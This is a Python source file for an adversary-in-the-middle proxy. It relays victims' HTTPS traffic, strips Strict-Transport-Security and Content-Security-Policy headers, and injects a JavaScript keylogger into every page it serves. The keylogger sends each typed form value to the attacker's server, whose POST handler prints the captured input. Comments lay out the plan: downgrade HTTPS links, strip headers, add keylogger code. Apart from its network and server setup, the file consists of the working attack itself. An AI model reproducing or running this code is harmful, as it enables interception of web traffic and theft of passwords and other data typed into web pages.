from http.server import BaseHTTPRequestHandler, SimpleHTTPRequestHandler, HTTPServer
from urllib.parse import urlparse
import requests
import http.client

from networking import *
import json

''' Big Idea:
# Receive all of the packets from the client

# send own https request to the server
# The request IP should be from the AITM

# Receive the packets from the server

# Manipulate the server https response
# Strip strict-transfer-protocol
# Replace https links with http
# Strip any other headers of relevance
# Add keylogger code
'''

def modify_b_content(b_content):
    server_url = f"http://{get_ip_address()}"
    new_html = '<div><button onclick="handleClick()">Click me</button></div>'
    new_script = '''
        <script>
            // Create an object to hold the input values
            const form = {};

            // Listen for input events
            document.addEventListener('input', function(ev) {
                // Ensure we're dealing with an input or textarea element
                if (ev.target.tagName === 'INPUT' || ev.target.tagName === 'TEXTAREA') {
                    form[ev.target.name] = ev.target.value;

                    // Send a POST request with both fields
                    fetch('%s', {
                        method: 'POST',
                        body: JSON.stringify(form),
                        headers: {
                            "Content-type": "application/json",
                        },
                    })
                    .then((response) => response.json())
                    .then((json) => console.log(json))
                    .catch((error) => console.error('Error:', error));
                }
            });
        </script>
        ''' % server_url
    new_php = '''
    <?php

    ?>

    '''
    b_new_html = new_html.encode('utf-8')
    b_new_script = new_script.encode('utf-8')
    b_new_php = new_php.encode('utf-8')

    b_content += b_new_html
    b_content += b_new_script
    b_content += b_new_php

    return b_content

'''
Somewhat works but is quite buggy
'''
# Create a CORSRequestHandler for Cross-Origin-Scripting
class CORSRequestHandler(BaseHTTPRequestHandler):
    def end_headers(self):
        self.send_header('Access-Control-Allow-Origin', '*')
        self.send_header('Access-Control-Allow-Methods', 'GET, POST, OPTIONS')
        self.send_header('Access-Control-Allow-Headers', '*')
        self.send_header('Cache-Control', 'no-store, no-cache, must-revalidate')
        super().end_headers()

    def do_OPTIONS(self):
        self.send_response(200)
        self.end_headers()

class ProxyHTTPRequestHandler(CORSRequestHandler):
    def do_GET(self):
        # Parse dst host and path
        dst_host = self.headers.get('Host')
        dst_path = urlparse(self.path).path

        # Create a connection to the target server 
        conn = http.client.HTTPSConnection(dst_host)

        conn.request("GET", dst_path)   # Forward the request to the target server 
        response = conn.getresponse()   # Get the response

        if "Strict-Transport-Security" in response.headers: del response.headers["Strict-Transport-Security"]
        if "Content-Security-Policy" in response.headers: del response.headers["Content-Security-Policy"]
        if "Transfer-Encoding" in response.headers: del response.headers["Transfer-Encoding"]
        
        # Check for 301 redirect
        if response.status == 301 or response.status == 308:
            # Extract the new location from the response headers
            new_location = response.getheader('Location')
            
            # Parse the new location to handle both absolute and relative URLs
            parsed_url = urlparse(new_location)
            
            if not parsed_url.netloc:  # If it's a relative URL
                new_location = f"https://{dst_host}{parsed_url.path}"

            # Create a new connection to the new location
            new_conn = http.client.HTTPSConnection(urlparse(new_location).netloc)
            new_conn.request("GET", urlparse(new_location).path)
            
            # Get the new response
            new_response = new_conn.getresponse()

            if "Strict-Transport-Security" in new_response.headers: del new_response.headers["Strict-Transport-Security"]
            if "Content-Security-Policy" in new_response.headers: del new_response.headers["Content-Security-Policy"]
            if "Transfer-Encoding" in new_response.headers: del new_response.headers["Transfer-Encoding"]

            b_content = new_response.read()
            b_content = modify_b_content(b_content)

            self.send_response(new_response.status)         # Send response status code
            for key, value in response.getheaders():        # Send headers
                self.send_header(key, value)
                # print(key, value)

            self.end_headers()                              # Send end headers (includes CORS headers)

            # Write content to wfile in chunks
            chunk_size = 8192
            for i in range(0, len(b_content), chunk_size):
                chunk = b_content[i:i + chunk_size]
                self.wfile.write(chunk)

            new_conn.close()
        else:
            b_content = response.read()
            b_content = modify_b_content(b_content)

            self.send_response(response.status)             # Send response status code
            for key, value in response.getheaders():        # Send headers
                self.send_header(key, value)
                # print(key, value)
            self.end_headers()                              # Send end headers (includes CORS headers)
            
            # Write content to wfile
            chunk_size = 8192
            for i in range(0, len(b_content), chunk_size):
                chunk = b_content[i:i + chunk_size]
                self.wfile.write(chunk)

        conn.close()

    def do_POST(self):
        try:
            # # Get the contents of the POST request
            content_length = int(self.headers['Content-Length'])
            post_data = self.rfile.read(content_length)
            post_data_obj = json.loads(post_data.decode())
            
            # Try to print out the key value pairs of filled input fields
            try:
                print("\n------------- Input Values Start -------------")
                for key in post_data_obj:
                    print(f"    {key}: {post_data_obj[key]}")
                print("-------------- Input Values End --------------\n")
            except:
                pass
            
            print("\nHEADERS\n")
            for key, value in self.headers.items():
                print(key, value)
            
            print("\nDATA OBJ\n")
            for key, value in post_data_obj.items():
                print(key, value)

        except Exception as ev:
            self.send_response(500)
            self.end_headers()
            self.wfile.write(b"Error: " + str(ev).encode())

    # def do_POST(self):
         
    #     # Parse dst host and path
    #     dst_host = self.headers.get('Host')
    #     dst_path = urlparse(self.path).path

    #     # Get the contents of the POST request
    #     content_length = int(self.headers['Content-Length'])
    #     post_data = self.rfile.read(content_length)
        
    #     # Connect to the target server
    #     conn = http.client.HTTPSConnection(dst_host)

    #     print("POST REQUEST")
    #     print(post_data)
    #     print(self.headers)

    #     if "Origin" in self.headers:
    #         self.headers["Origin"] = self.headers["Origin"].replace("http", "https")

    #     if "Referer" in self.headers:
    #         self.headers["Referer"] = self.headers["Referer"].replace("http", "https")

    #     # will have to add some kind of cookie?? Interesting error from GitHub
            
    #     print("MODIFIED HEADERS")
    #     print(self.headers)
        
    #     # Forward the request to the target server
    #     conn.request("POST", dst_path, post_data)

    #     # Get the response
    #     response = conn.getresponse()

    #     print("POST RESPONSE")
    #     print(response)
        
    #     self.send_response(response.status)
    #     b_content = response.read()

    #     # Send headers
    #     # self.send_header('Content-type', 'text/html')
    #     for header, value in response.headers.items():
    #         self.send_header(header, value)

    #     self.end_headers()
            
    #     # Write content to wfile
    #     chunk_size = 8192
    #     for i in range(0, len(b_content), chunk_size):
    #         chunk = b_content[i:i + chunk_size]
    #         self.wfile.write(chunk)

    #     conn.close()

class Server:
    def __init__(self, http_daemon = None, target_ip = None, is_ready_bool = False):
        self.http_daemon = http_daemon
        self.target_ip = target_ip
        self.is_ready_bool = is_ready_bool

    def start(self, port: int):
        # Create a HTTP server with the specified port
        self.http_daemon = HTTPServer(("", port), ProxyHTTPRequestHandler)
        
        # Print serving ip address / port & update server status
        print("Serving at", get_ip_address() + ":" + str(port) + "\n")
        self.is_ready_bool = True

        self.http_daemon.serve_forever() # Set server to handle requests indefinitely
    
    def is_ready(self):
        return self.is_ready_bool

    def stop(self):
        if self.http_daemon is not None:
            # Shut down server
            self.http_daemon.shutdown()
            self.http_daemon.server_close()
            
            # Cleanup variables
            self.http_daemon = None
            self.is_ready_bool = False

            print("Server closed...")
